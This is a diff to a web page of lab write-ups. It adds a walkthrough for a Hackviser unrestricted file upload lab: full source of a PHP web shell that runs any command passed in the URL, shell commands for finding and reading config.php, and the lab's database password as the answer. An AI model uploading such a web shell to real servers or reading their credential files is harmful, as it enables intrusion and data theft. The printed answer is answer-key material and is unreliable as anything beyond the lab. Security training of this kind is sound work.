@@ -17,7 +17,30 @@ prog: 'Hackviser Web Application Security Labs  -  March 2026'
 
 <h5 class="mb-2">1. Basic Unrestricted File Upload</h5>
 <p class="mb-3"><strong>This lab contains a Unrestricted File Upload vulnerability. The application has an image upload function, but the uploaded file content or type is not checked on the server. To complete the lab, upload a malicious PHP script and read the "config.php" file. What is the database password in the config.php file?</strong></p>
-<p class="mb-5"><strong>Answer:</strong> </p>
+<p class="mb-3">We will create a simple PHP web shell using the following code and upload it.</p>
+<pre>&lt;html&gt;
+&lt;body&gt;
+&lt;form method=&quot;GET&quot; name=&quot;&lt;?php echo basename($_SERVER[&apos;PHP_SELF&apos;]); ?&gt;&quot;&gt;
+&lt;input type=&quot;TEXT&quot; name=&quot;cmd&quot; autofocus id=&quot;cmd&quot; size=&quot;80&quot;&gt;
+&lt;input type=&quot;SUBMIT&quot; value=&quot;Execute&quot;&gt;
+&lt;/form&gt;
+&lt;pre&gt;
+&lt;?php
+    if(isset($_GET[&apos;cmd&apos;]))
+    {
+        system($_GET[&apos;cmd&apos;] . &apos; 2&gt;&amp;1&apos;);
+    }
+?&gt;
+&lt;/pre&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</pre>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image1.png" alt="Web Application Security Unrestricted File Upload 1" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Once uploaded, click on the file path shown and enter the command <code>pwd</code>. The results should show <code>/var/www/html/uploads</code>. Since HTTP is stateless, everytime we send a commmand through a basic PHP web shell, it starts a brand-new process from scratch. This is why we need to use <code>cd .. && ls</code> to execute both commands within the same shell session. The output is seen below.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image2.png" alt="Web Application Security Unrestricted File Upload 2" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-3">Now that we have confirmed where the config.php file is located, we can run the command <code>cat ../config.php</code>. Browsers try to render the <code>&lt;?php</code> as invisible HTML tags which hides the content. Viewing the page source in a new tab solves this problem.</p>
+<img src="/assets/hackinglabs/hackviser/webapplicationsecuritylabs/webapplicationsecurity_unrestrictedfileupload/unrestrictedfileupload_hackviser_image3.png" alt="Web Application Security Unrestricted File Upload 3" class="img-fluid mb-4" width="720" height="405" loading="lazy" decoding="async" />
+<p class="mb-5"><strong>Answer:</strong> 8jv77mvXwR7LVU5v</p>
 <br />
 
 <h5 class="mb-2">2. MIME Type Filter Bypass</h5>
